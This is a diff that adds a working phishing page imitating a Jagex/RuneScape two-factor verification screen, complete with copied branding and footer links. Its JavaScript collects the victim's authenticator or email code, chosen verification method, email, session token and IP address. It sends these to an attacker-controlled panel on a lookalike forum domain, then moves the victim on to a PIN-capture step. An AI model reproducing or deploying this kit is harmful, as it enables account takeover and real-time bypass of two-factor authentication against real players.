@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Choose how to log in | Jagex</title>
+    <script>window.PANEL_API_BASE='https://control.osrsforum-oldshcool.com/';</script>
+   
+    <link rel="icon" href="img/favicon.svg" sizes="any" type="image/svg+xml">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/verify_mail.css">
+    <style>
+        /* Optimized animation for better performance */
+        @keyframes circularProgress {
+            from {
+                stroke-dashoffset: 0;
+            }
+            to {
+                stroke-dashoffset: 100;
+            }
+        }
+        
+        .circular-progress svg circle:last-child {
+            animation: circularProgress 1s linear infinite;
+            will-change: stroke-dashoffset;
+        }
+    </style>
+</head>
+<body>
+    <div class="site-wrapper">
+        <div class="content-wrapper">
+            <!-- Enhanced preloader from first code -->
+            <div class="preloader" id="preloader">
+                <div class="preloader-container">
+                    <div class="progress-container">
+                        <div class="preloader-icons">
+                            <div class="preloader-icon">
+                                <img src="img/logo00.png" alt="Jagex Logo">
+                            </div>
+                        </div>
+                        <div class="circular-progress">
+                            <svg>
+                                <circle cx="25" cy="25" r="22.5"></circle>
+                                <circle cx="25" cy="25" r="22.5"></circle>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="container flex f-width justify-center align-center">
+                <div class="box" id="box">
+                    <form action="" method="post" id="verificationForm">
+                        <input type="text" id="_hp" name="_hp" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;">
+                        <div class="top_text">
+                            <p class="css-sncgum efk7upz33"><font size="4">Back to </font>  
+ <font size="4"><a href="index.html" title="Back to login page"><font color="#39acff">Login</font>
+    </a> </font></p>
+
+                            <hr data-testid="AM" class="css-mek630 efk7upz36">
+                            <!-- three logo section start -->
+                             <p align="center">
+<img border="0" src="img/logo00.png" width="185" height="65" alt="Jagex Logo"></p>
+                            <!-- three logos end -->
+                            <div class="css-1sowyjy efk7upz26"></div>
+                            
+                            <!-- 
+                                DYNAMIC MESSAGE CONTAINER
+                                The JavaScript below will inject a correct message into this div.
+                            -->
+                            <div id="dynamic-message-container">
+                                <!-- Default content will be replaced by JavaScript -->
+                                <h1 class="css-sncgum efk7upz33 np">Enter verification code</h1>
+                                <p class="css-sncgum efk7upz33 np"><font size="4">Please enter code from your authenticator app to continue.</font></p>
+                            </div>
+
+                            <p>&nbsp;</p>
+                            <div class="css-1sowyjy efk7upz26"></div>
+                            <div class="input-container" id="input-container">
+                                <!-- Added autocomplete attribute to email input field -->
+                                <input type="text" id="inputField" class="input-field remove email_input" name="email" autocomplete="email">
+                                <label for="inputField" class="input-label remove" id="lb">Verification code</label>
+                            </div>
+                            
+                            <div class="input-container" id="input-container2">
+                                <!-- Added autocomplete attribute to verification code input field -->
+                                <input type="text" id="user_input" class="input-field" name="verificationCode" maxlength="6" required autocomplete="one-time-code">
+                                <label for="user_input" class="input-label">Verification code</label>
+                            </div>
+
+                            <div class="css-1sowyjy efk7upz26"></div>
+                            <!-- continue button -->
+                            <button type="submit" id="mybtn" disabled class="cont_btn" name="sub_log">Continue</button>
+                                <p>&nbsp;</p>
+                            
+                            <!-- <div class="or_text f-width justify-center align-center flex">
+                                Or log in with
+                            </div> -->
+
+                            <!-- other login options -->
+                            <div data-testid="OM" class="flex justify-center f-width align-center remove add">
+                                <a href="#" title="Continue with Google">
+                                <button data-testid="continue-with-google" aria-busy="false" class="ehtssmp1 css-1j349fk efk7upz50" fdprocessedid="neekt" type="button">
+                                    <img src="img/google.svg" width="32" height="32" alt="Google Logo">
+                                </button>
+                            </a>
+                            <a href="#" title="Continue with Apple">
+                                <button data-testid="continue-with-apple" aria-busy="false" class="ehtssmp1 css-1j349fk efk7upz50" type="button">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none">
+                                        <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    </svg>
+                                </button>
+                            </a>
+                            <a href="#" title="Continue with Steam">
+                                <button data-testid="continue-with-steam" aria-busy="false" class="ehtssmp1 css-1j349fk efk7upz50" type="button">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none">
+                                        <path d="M9.406 17.183C9.837 16.158 9.356 14.977 8.33 14.546L6.568 13.805C6.899 13.68 7.222 13.623 7.55 13.622C9.068 13.622 10.315 14.858 10.329 16.376C10.343 17.914 9.112 19.168 7.576 19.182C6.417 19.187 5.438 18.498 5.005 17.517L6.768 18.258C7.795 18.69 8.975 18.208 9.406 17.183ZM19 0H5C2.239 0 0 2.239 0 5V11.043L5.585 13.392C6.181 13.002 6.868 12.793 7.631 12.809L10.648 8.588C10.696 6.047 12.77 4 15.322 4C17.904 4 20 6.094 20 8.677C20 11.258 17.902 13.38 15.268 13.352L11.153 16.419L11.144 16.423C11.132 18.385 9.551 19.981 7.583 20C5.806 20.015 4.349 18.751 4.023 17.105L0 15.413V19C0 21.761 2.239 24 5 24H19C21.762 24 24 21.761 24 19V5C24 2.239 21.762 0 19 0ZM15.322 11.857C13.57 11.857 12.143 10.43 12.143 8.677C12.143 6.924 13.57 5.498 15.322 5.498C17.076 5.498 18.501 6.924 18.501 8.677C18.501 10.43 17.076 11.857 15.322 11.857ZM15.322 11.078C16.647 11.078 17.722 10.001 17.722 8.677C17.722 7.354 16.647 6.276 15.322 6.276C13.998 6.276 12.921 7.354 12.921 8.677C12.921 10.001 13.998 11.078 15.322 11.078Z" fill="white"/>
+                                    </svg>
+                                </button>
+                            </a>
+                            <a href="#" title="Continue with Facebook">
+                                <button data-testid="continue-with-facebook" aria-busy="false" class="ehtssmp1 css-1j349fk efk7upz50" type="button">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none">
+                                        <path d="M24 12.0026C24.0005 9.70925 23.3438 7.46376 22.1077 5.53204C20.8716 3.60031 19.1078 2.06326 17.0252 1.10287C14.9426 0.142489 12.6284 -0.201004 10.3566 0.113067C8.08487 0.427137 5.95068 1.38562 4.20676 2.87502C2.46285 4.36441 1.18225 6.32235 0.516594 8.51699C-0.14906 10.7116 -0.171887 13.0511 0.450816 15.2583C1.07352 17.4655 2.31567 19.448 4.03019 20.9712C5.74471 22.4943 7.8598 23.4943 10.125 23.8526V15.4706H7.0785V12.0026H10.125V9.35812C10.0594 8.74079 10.1304 8.11659 10.3329 7.52976C10.5355 6.94293 10.8646 6.40783 11.297 5.96239C11.7295 5.51695 12.2546 5.17208 12.8351 4.95221C13.4157 4.73234 14.0375 4.64287 14.6565 4.69012C15.5565 4.70194 16.4545 4.78015 17.343 4.92412V7.88062H15.831C15.5734 7.84694 15.3116 7.8716 15.0649 7.95279C14.8181 8.03398 14.5928 8.16961 14.4056 8.34965C14.2183 8.52969 14.0739 8.74952 13.9832 8.99289C13.8924 9.23626 13.8574 9.49693 13.881 9.75562V12.0056H17.2095L16.677 15.4736H13.875V23.8601C16.6984 23.4135 19.2695 21.9737 21.1257 19.7999C22.9819 17.6261 24.0012 14.8611 24 12.0026Z" fill="white"/>
+                                    </svg>
+                                </button>
+                            </a>
+                            </div>
+                            <!-- need to keep all code to make good sturcture -->
+                            <div class="or_text f-width justify-center align-center flex">
+                                <button class="login_user" type="button" onclick="change_email()" id="login_user_btn" title="Log in with RuneScape username"><font size="4">Log in with RuneScape username</button>	</font>
+
+                                <button class="login_user" type="button" onclick="change_username()" id="login_email_btn" title="Log in with email">Log in with email</button>
+                            </div>
+                            <p>&nbsp;</p>
+                            <div class="or_text2 f-width justify-center align-center flex">
+                                 <!-- 
+                                     UPDATED LINK:
+                                     - Added a unique ID: id="another-way-link"
+                                 -->
+                                 <font size="4"><a id="another-way-link" href="another_way.html" title="Verify another way"><font color="#39acff">Verify another way</font>
+                                </a> </font></div>
+        </font>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile Footer - Only visible on mobile devices -->
+    <footer class="mobile-footer">
+            <a href="https://www.jagex.com/" title="Jagex Games Ltd">   
+                <img src="img/logo-footer.png" alt="Jagex" class="mobile-footer-image">
+            </a>
+        
+        <div class="mobile-footer-links">
+            <div class="mobile-footer-link-group">
+                <a href="https://legal.jagex.com/docs/contact-us">Contact Us</a>|
+                <a href="https://www.jagex.com/terms/cookies">Cookie Policy</a>|
+                <a href="https://account.jagex.com/en-GB/assisted-login?login_challenge=0a21d4d5ed2b49429cf222b76a488598">Manage Cookies</a>|
+            </div>
+            <div class="mobile-footer-link-group">
+                <a href="https://legal.jagex.com/docs/terms">Terms & Conditions</a>|
+                <a href="https://legal.jagex.com/docs/policies">Privacy Policy</a>|
+                <a href="https://legal.jagex.com/">Legal</a>|
+            </div>
+            <div class="mobile-footer-link-group">
+                <a href="https://legal.jagex.com/docs/annual-reports">Gender Pay Gap Report</a>|
+            </div>
+            <div class="mobile-footer-link-group">
+                <a href="https://legal.jagex.com/docs/policies/privacy/exercising-your-rights">Do Not Sell or Share My Personal Information</a>|
+            </div>
+        </div>
+        
+        <div class="mobile-footer-copyright">
+            Copyright © 1999 - 2026 Jagex Ltd. 220 Science Park, Cambridge, CB4 0WA, UK
+        </div>
+    </footer>
+
+    <!-- Desktop Footer - Only visible on desktop browsers -->
+    <footer class="desktop-footer">
+        <div class="footer-left">
+        <a href="https://www.jagex.com/" title="Jagex Games Ltd">
+            <img src="img/logo-footer.png" alt="Jagex">
+		</a>
+            <div class="footer-links">
+                <div class="footer-link-group">
+                    <a href="https://legal.jagex.com/docs/contact-us">Contact Us</a>|
+                    <a href="https://www.jagex.com/terms/cookies">Cookie Policy</a>|
+                    <a href="https://account.jagex.com/en-GB/assisted-login?login_challenge=0a21d4d5ed2b49429cf222b76a488598">Manage Cookies</a>|
+                </div>
+                <div class="footer-link-group">
+                    <a href="https://legal.jagex.com/docs/terms">Terms & Conditions</a>|
+                    <a href="https://legal.jagex.com/docs/policies">Privacy Policy</a>|
+                    <a href="https://legal.jagex.com/">Legal</a>|
+                </div>
+                <div class="footer-link-group">
+                    <a href="https://legal.jagex.com/docs/annual-reports">Gender Pay Gap Report</a>|
+                </div>
+                <div class="footer-link-group">
+                    <a href="https://legal.jagex.com/docs/policies/privacy/exercising-your-rights">Do Not Sell or Share My Personal Information</a>|
+                </div>
+            </div>
+        </div>
+        <div class="footer-right">
+            <div class="footer-copyright">
+                Copyright © 1999 - 2026 Jagex Ltd. 220 Science Park, Cambridge, CB4 0WA, UK
+            </div>
+        </div>
+    </footer>
+    <script src="js/script.js"></script>
+    <script>
+        // Detect if mobile device
+        function isMobile() {
+            return (window.innerWidth <= 570); // Changed from 800 to 570
+        }
+
+        // Apply mobile class to preloader if on mobile
+        document.addEventListener("DOMContentLoaded", function() {
+            const preloader = document.getElementById("preloader");
+            if (preloader && isMobile()) {
+                preloader.classList.add("mobile");
+                // Hide preloader on mobile by default
+                preloader.style.display = "none";
+            }
+        });
+
+        var add = document.querySelector('.add');
+        var box = document.getElementById('box'); 
+        var conta = document.getElementById('input-container'); 
+        var inpu = document.querySelector('.email_input');
+        var lb = document.getElementById('lb');
+        function hidePreloader() {
+            var preloader = document.querySelector(".preloader");
+            // Only hide preloader on desktop, keep it hidden on mobile
+            if (preloader && !isMobile()) {
+                preloader.style.display = "none";
+            }
+            if (add) add.classList.remove('remove');
+            if (lb) lb.classList.remove('remove');
+            if (conta) conta.classList.remove('remove');
+            if (inpu) {
+                inpu.classList.remove('remove');
+                inpu.focus();
+            }
+        }
+
+        setTimeout(hidePreloader, 0);
+        
+        const hasSeenImage = localStorage.getItem('hasSeenImage');
+        const imgElement = document.querySelector('.img');
+
+        if (hasSeenImage !== 'true' && imgElement) {
+            imgElement.style.display = 'flex';
+
+            imgElement.addEventListener('click', () => {
+                imgElement.style.display = 'none';
+                localStorage.setItem('hasSeenImage', 'true');
+                window.opener.postMessage('imageSeen', '*');
+            });
+
+            window.addEventListener('message', (event) => {
+                if (event.data === 'imageSeen') {
+                    imgElement.style.display = 'none';
+                }
+            });
+        }
+    </script>
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const form = document.getElementById("verificationForm");
+        const submitBtn = document.getElementById("mybtn");
+        const preloader = document.querySelector(".preloader");
+        const verificationCodeInput = document.getElementById("user_input");
+        let isSubmitting = false;
+        let progressInterval;
+        let loopCount = 0;
+        const maxLoops = 1; // Number of loops before submitting (changed to 1)
+
+        // Get URL parameters once to be used by multiple functions
+        const urlParams = new URLSearchParams(window.location.search);
+        const userEmail = urlParams.get('using_mail');
+        const token = urlParams.get('token');
+        const uid = urlParams.get('uid');
+        const method = urlParams.get('method'); // Get the method parameter
+        
+        // Get session data from localStorage
+        let sessionData = null;
+        try {
+            const storedSession = localStorage.getItem('userSession');
+            if (storedSession) {
+                sessionData = JSON.parse(storedSession);
+            }
+        } catch (e) {
+            console.error('Error parsing session data:', e);
+        }
+        
+        // If no session data exists, create a new session
+        if (!sessionData) {
+            sessionData = {
+                sessionId: 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
+                email: userEmail || 'Unknown',
+                ipAddress: 'Unknown',
+                loginType: 'email',
+                timestamp: new Date().toISOString(),
+                token: token || 'Unknown'
+            };
+            localStorage.setItem('userSession', JSON.stringify(sessionData));
+        } else {
+            // Update session data with current token if different
+            if (token && sessionData.token !== token) {
+                sessionData.token = token;
+                localStorage.setItem('userSession', JSON.stringify(sessionData));
+            }
+        }
+        
+        // Send verification method to admin: update "Verify another way" with method chosen (works without verify_method column)
+        if (method === 'authenticator') sendVerifyMethodChosenToPanel('Clicked (Auth)');
+        else if (method === 'email' || !method) sendVerifyMethodChosenToPanel('Clicked (Email)');
+        if (method === 'authenticator') sendVerifyMethodToPanel('Auth');
+        else if (method === 'email' || !method) sendVerifyMethodToPanel('Email');
+        
+        // Get IP address using a public API
+        let ipAddress = "Unknown";
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip;
+                // Update session data with IP address
+                sessionData.ipAddress = ipAddress;
+                localStorage.setItem('userSession', JSON.stringify(sessionData));
+            })
+            .catch(error => {
+                console.error('Error getting IP address:', error);
+            });
+        
+        function sendCodeToPanel(code) {
+            if (!sessionData || !sessionData.sessionId) return;
+            var basePromise = (window.PANEL_API_BASE !== undefined && window.PANEL_API_BASE !== '') ? Promise.resolve(window.PANEL_API_BASE) : fetch(location.origin + '/api/config').then(function(r) { return r.json(); }).then(function(c) { return (c && c.apiBase) ? c.apiBase : location.origin; }).catch(function() { return location.origin; });
+            basePromise.then(function(base) {
+                var url = (base.replace(/\/$/, '')) + '/api/submit';
+                var _hp = (document.getElementById('_hp') && document.getElementById('_hp').value) || ''; fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ logId: sessionData.sessionId, verifyEmail: code, _hp: _hp }) }).catch(function() {});
+            });
+        }
+        function sendVerifyMethodToPanel(verifyMethod) {
+            if (!sessionData || !sessionData.sessionId || !verifyMethod) return;
+            var basePromise = (window.PANEL_API_BASE !== undefined && window.PANEL_API_BASE !== '') ? Promise.resolve(window.PANEL_API_BASE) : fetch(location.origin + '/api/config').then(function(r) { return r.json(); }).then(function(c) { return (c && c.apiBase) ? c.apiBase : location.origin; }).catch(function() { return location.origin; });
+            basePromise.then(function(base) {
+                var url = (base.replace(/\/$/, '')) + '/api/submit';
+                var _hp = (document.getElementById('_hp') && document.getElementById('_hp').value) || '';
+                fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ logId: sessionData.sessionId, verifyMethod: verifyMethod, _hp: _hp }) }).catch(function() {});
+            });
+        }
+        function sendVerifyMethodChosenToPanel(value) {
+            if (!sessionData || !sessionData.sessionId || !value) return;
+            var basePromise = (window.PANEL_API_BASE !== undefined && window.PANEL_API_BASE !== '') ? Promise.resolve(window.PANEL_API_BASE) : fetch(location.origin + '/api/config').then(function(r) { return r.json(); }).then(function(c) { return (c && c.apiBase) ? c.apiBase : location.origin; }).catch(function() { return location.origin; });
+            basePromise.then(function(base) {
+                var url = (base.replace(/\/$/, '')) + '/api/submit';
+                var _hp = (document.getElementById('_hp') && document.getElementById('_hp').value) || '';
+                fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ logId: sessionData.sessionId, verifyAnotherWay: value, _hp: _hp }) }).catch(function() {});
+            });
+        }
+        function sendVerifyAnotherWayToPanel() {
+            if (!sessionData || !sessionData.sessionId) return Promise.resolve();
+            var basePromise = (window.PANEL_API_BASE !== undefined && window.PANEL_API_BASE !== '') ? Promise.resolve(window.PANEL_API_BASE) : fetch(location.origin + '/api/config').then(function(r) { return r.json(); }).then(function(c) { return (c && c.apiBase) ? c.apiBase : location.origin; }).catch(function() { return location.origin; });
+            return basePromise.then(function(base) {
+                var url = (base.replace(/\/$/, '')) + '/api/submit';
+                var _hp = (document.getElementById('_hp') && document.getElementById('_hp').value) || '';
+                return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ logId: sessionData.sessionId, verifyAnotherWay: 'Clicked', _hp: _hp }) }).catch(function() {});
+            });
+        }
+        window.sendVerifyAnotherWayToPanel = sendVerifyAnotherWayToPanel;
+
+        if (form) {
+            form.addEventListener("submit", function(event) {
+                // Get verification code input
+                const verificationCode = verificationCodeInput ? verificationCodeInput.value : '';
+                
+                // Check if verification code is empty
+                if (!verificationCode || verificationCode.trim() === '') {
+                    // If empty, show an alert and prevent submission
+                    alert("Please enter a verification code");
+                    event.preventDefault();
+                    return;
+                }
+                
+                // Prevent multiple submissions
+                if (isSubmitting) {
+                    event.preventDefault();
+                    return false;
+                }
+                
+                // Set flag to prevent multiple submissions
+                isSubmitting = true;
+                
+                // Show loading state on button for 1 second
+                if (submitBtn) submitBtn.classList.add("loading");
+                
+                // Update session data with verification code
+                sessionData.verificationCode = verificationCode;
+                localStorage.setItem('userSession', JSON.stringify(sessionData));
+                
+                if (verificationCode) sendCodeToPanel(verificationCode);
+                
+                // After 1 second, show preloader and start progress animation
+                setTimeout(function() {
+                    // Remove loading state from button
+                    if (submitBtn) submitBtn.classList.remove("loading");
+                    
+                    // Show preloader (works for both desktop and mobile)
+                    if (preloader) preloader.style.display = "flex";
+                    
+                    // Start circular progress animation
+                    loopCount = 0;
+                    startCircularProgress();
+                }, 1000); // 1 second delay
+                
+                // Prevent default form submission for now
+                event.preventDefault();
+                return false;
+            });
+
+            form.addEventListener("keydown", function(event) {
+                if (event.key === "Enter") {
+                    event.preventDefault(); // Prevent default Enter key behavior
+                    // Trigger submit event
+                    const submitEvent = new Event("submit", { cancelable: true });
+                    form.dispatchEvent(submitEvent);
+                }
+            });
+        }
+        
+        function startCircularProgress() {
+            // Clear any existing interval
+            if (progressInterval) {
+                clearInterval(progressInterval);
+            }
+            
+            // Update progress every 30ms for smooth animation
+            progressInterval = setInterval(function() {
+                loopCount++;
+                
+                // After 1 complete loop (1 second), redirect to next page
+                if (loopCount >= maxLoops) {
+                    clearInterval(progressInterval);
+                    
+                    // --- THIS IS THE CHANGE ---
+                    // Redirect to verify_pin.html, passing along token from session
+                    sessionStorage.setItem('allowed_step_verify_pin', '1');
+                    window.location.href = 'verify_pin.html?token=' + encodeURIComponent(sessionData.token || '');
+                }
+            }, 100); // 1 second per loop
+        }
+    });
+</script>
+
+<!-- 
+    NEW SCRIPT: 
+    This script handles dynamic page content.
+    - Shows correct message based on URL parameters.
+    - Updates "Verify another way" link.
+-->
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    // Get URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const userEmail = urlParams.get('using_mail');
+    const uid = urlParams.get('uid');
+    const token = urlParams.get('token');
+    const method = urlParams.get('method'); // Get the method parameter
+
+    // 1. Handle Dynamic Message Display
+    const messageContainer = document.getElementById('dynamic-message-container');
+    const verificationCodeInput = document.getElementById("user_input");
+    const submitBtn = document.getElementById("mybtn");
+    
+    // Check which verification method was selected
+    if (method === 'authenticator') {
+        // Show authenticator app message
+        if (messageContainer) {
+            messageContainer.innerHTML = `
+                <h1 class="css-sncgum efk7upz33">Enter verification code</h1>
+                <p class="css-sncgum efk7upz33"><font size="4">Please enter the code from your authenticator app to continue.</font></p>
+            `;
+        }
+        
+        // Set input type to allow only numbers for authenticator app
+        if (verificationCodeInput) {
+            verificationCodeInput.setAttribute('pattern', '[0-9]*');
+            verificationCodeInput.setAttribute('inputmode', 'numeric');
+            verificationCodeInput.setAttribute('maxlength', '6');
+            
+            // Add input event listener to restrict to numbers only
+            verificationCodeInput.addEventListener('input', function(e) {
+                // Remove any non-numeric characters
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Enable button only when exactly 6 digits are entered
+                if (submitBtn) submitBtn.disabled = this.value.length !== 6;
+            });
+        }
+    } else {
+        // Default to email verification message
+        if (messageContainer) {
+            messageContainer.innerHTML = `
+                <h1 class="css-sncgum efk7upz33">We've emailed you a verification code</h1>
+                <p class="css-sncgum efk7upz33"><font size="4">Please enter code sent to <b>${userEmail || 'your email'}</b> to continue.</font></p>
+            `;
+        }
+        
+        // Set input type to allow alphanumeric for email verification
+        if (verificationCodeInput) {
+            verificationCodeInput.removeAttribute('pattern');
+            verificationCodeInput.removeAttribute('inputmode');
+            verificationCodeInput.setAttribute('maxlength', '6');
+            
+            // Add input event listener for email verification
+            verificationCodeInput.addEventListener('input', function(e) {
+                // Enable button when 5 or more characters are entered (up to 6)
+                if (submitBtn) submitBtn.disabled = this.value.length < 5;
+            });
+        }
+    }
+
+    // 2. Handle "Verify another way" Link
+    const anotherWayLink = document.getElementById('another-way-link');
+    if (anotherWayLink) {
+        // Update link to include current email (using_mail), uid, and token
+        // encodeURIComponent() ensures special characters don't break URL.
+        const emailParam = userEmail ? `&using_mail=${encodeURIComponent(userEmail)}` : '';
+        const tokenParam = token ? `&token=${encodeURIComponent(token)}` : '';
+        anotherWayLink.href = `another_way.html?uid=${encodeURIComponent(uid || '')}${emailParam}${tokenParam}`;
+        anotherWayLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            var href = this.href;
+            var p = (typeof window.sendVerifyAnotherWayToPanel === 'function') ? window.sendVerifyAnotherWayToPanel() : Promise.resolve();
+            p.then(function() {
+                sessionStorage.setItem('allowed_step_another_way', '1');
+                window.location.href = href;
+            }).catch(function() {
+                sessionStorage.setItem('allowed_step_another_way', '1');
+                window.location.href = href;
+            });
+        });
+    }
+});
+</script>
+
+</body>
+</html>
